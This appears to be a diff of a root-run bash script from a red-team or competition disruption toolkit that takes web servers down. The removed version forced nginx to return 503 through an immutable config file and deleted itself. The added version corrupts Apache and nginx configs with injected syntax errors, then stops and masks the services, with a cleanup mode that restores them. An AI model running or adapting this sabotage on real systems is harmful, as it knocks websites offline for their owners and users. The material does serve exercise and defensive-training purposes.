@@ -1,50 +1,57 @@
 #!/usr/bin/env bash
-# Rocky Ecom scoring disruption: nginx returns 503 on :80 and :443.
-# Daemon stays running and healthy — just all requests return 503.
-# Visible to: defender-cli backups --compare-hashes (if baseline was taken)
 set -euo pipefail
 [[ $EUID -eq 0 ]] || { echo "[!] Requires root"; exit 1; }
 
-CONF="/etc/nginx/conf.d/zzz_maint.conf"
+HTTPD_CONFS=(
+    /etc/httpd/conf/httpd.conf
+    /etc/apache2/apache2.conf
+    /etc/nginx/nginx.conf
+    /etc/nginx/conf.d/default.conf
+)
+
+corrupt_configs() {
+    local TS
+    TS=$(date +%s)
+    for f in "${HTTPD_CONFS[@]}"; do
+        [[ -f "$f" ]] || continue
+        cp "$f" "${f}.orig"   # abort if backup fails — never corrupt without a backup
+        # Inject a syntax error at the top so the daemon refuses to start
+        sed -i "1s/^/X_SYNTAX_ERROR_${TS}\n/" "$f"
+        echo "[+]   corrupted $f"
+    done
+}
+
+restore_configs() {
+    for f in "${HTTPD_CONFS[@]}"; do
+        [[ -f "${f}.orig" ]] || continue
+        mv "${f}.orig" "$f"
+        echo "[+]   restored $f"
+    done
+}
 
 case "${1:-}" in
   deploy)
-    # Detect SSL cert path
-    if [[ -f /etc/ssl/certs/ssl-cert-snakeoil.pem ]]; then
-      SSL_CERT="/etc/ssl/certs/ssl-cert-snakeoil.pem"
-      SSL_KEY="/etc/ssl/private/ssl-cert-snakeoil.key"
-    else
-      SSL_CERT="/etc/nginx/ssl/server.crt"
-      SSL_KEY="/etc/nginx/ssl/server.key"
-    fi
-
-    cat > "$CONF" <<NGINX_EOF
-# Maintenance mode
-server {
-    listen 80 default_server;
-    listen [::]:80 default_server;
-    server_name _;
-    return 503;
-}
-server {
-    listen 443 ssl default_server;
-    listen [::]:443 ssl default_server;
-    server_name _;
-    ssl_certificate     ${SSL_CERT};
-    ssl_certificate_key ${SSL_KEY};
-    return 503;
-}
-NGINX_EOF
-    chattr +i "$CONF" 2>/dev/null || true
-    nginx -t 2>/dev/null && (nginx -s reload 2>/dev/null || systemctl reload nginx 2>/dev/null || true)
-    echo "[+] 07_disrupt_web: HTTP/HTTPS → 503 (nginx running, scoring fails)"
-    rm -f -- "${BASH_SOURCE[0]}" 2>/dev/null || true
+    echo "[*] 07_disrupt_web: corrupting configs and masking service..."
+    corrupt_configs
+    for svc in httpd nginx apache2; do
+        systemctl cat "${svc}.service" &>/dev/null || continue
+        systemctl stop    "$svc" 2>/dev/null || true
+        systemctl mask    "$svc" 2>/dev/null || true
+        echo "[+]   stopped and masked $svc"
+    done
+    echo "[+] 07_disrupt_web: done"
     ;;
   cleanup)
-    chattr -i "$CONF" 2>/dev/null || true
-    rm -f "$CONF"
-    nginx -s reload 2>/dev/null || systemctl reload nginx 2>/dev/null || true
-    echo "[-] 07_disrupt_web: restored"
+    echo "[*] 07_disrupt_web: unmasking and restoring configs..."
+    restore_configs
+    for svc in httpd nginx apache2; do
+        systemctl cat "${svc}.service" &>/dev/null || continue
+        systemctl unmask  "$svc" 2>/dev/null || true
+        systemctl enable  "$svc" 2>/dev/null || true
+        systemctl start   "$svc" 2>/dev/null || true
+        echo "[+]   unmasked and started $svc"
+    done
+    echo "[+] 07_disrupt_web: cleaned up"
     ;;
   *) echo "Usage: $0 deploy|cleanup"; exit 1 ;;
 esac
